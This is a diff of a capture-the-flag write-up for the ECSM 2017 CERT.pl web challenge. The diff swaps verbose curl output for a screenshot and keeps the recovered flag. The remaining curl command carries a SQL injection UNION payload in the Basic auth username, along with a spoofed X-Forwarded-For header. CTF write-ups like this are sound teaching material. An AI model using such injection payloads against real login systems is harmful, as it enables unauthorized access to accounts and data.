@@ -695,48 +695,14 @@ One last ```curl``` command gives us message we're looking for:
 
 ```
 $ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'VeRySeCr3tAgent','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions
-
-*   Trying 136.243.148.95...
-* TCP_NODELAY set
-* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
-* Server auth using Basic with user 'name' or '1'='2' UNION SELECT 'VeRySeCr3tAgent','5f4dcc3b5aa765d61d8327deb882cf99'--'
-> GET /index.php/instructions HTTP/1.1
-> Host: ecsm2017.cert.pl:6044
-> Authorization: Basic bmFtZScgb3IgJzEnPScyJyBVTklPTiBTRUxFQ1QgJ1ZlUnlTZUNyM3RBZ2VudCcsJzVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5Jy0tOnBhc3N3b3Jk
-> User-Agent: hackerone.com/bl4de
-> Accept: */*
-> X-Forwarded-For: 175.45.176.100
->
-< HTTP/1.1 200 OK
-< Date: Fri, 17 Nov 2017 00:08:16 GMT
-< Server: Apache
-< Vary: Accept-Encoding
-< Content-Length: 365
-< Content-Type: text/html; charset=UTF-8
-<
-<html>
-<head>
-<style>
-body { background-color: #AA0000; color: white; font-size: 300%;}
-</style>
-</head>
-<body>
-
-<nav>
-    <a href="/index.php/home">집</a>
-    |
-    <a href="/index.php/instructions">명령</a>
-</nav>
-
-<hr />
-
-<h2>안녕하십니까</h2><h3>여기에 당신을위한 메시지가 있습니다.:</h3><p>- ecsm{cyber.szpiegostwo}</p>
-</body>
-* Connection #0 to host ecsm2017.cert.pl left intact
-</html>
 ```
 
-And here we are: __ecsm{cyber.szpiegostwo}__ (Eng: 'cyber.spying')
+And here we are: 
+
+![screen](web1/6.png)
+
+
+The flag: __ecsm{cyber.szpiegostwo}__ (Eng: 'cyber.spying')
 
 
 ## Summary
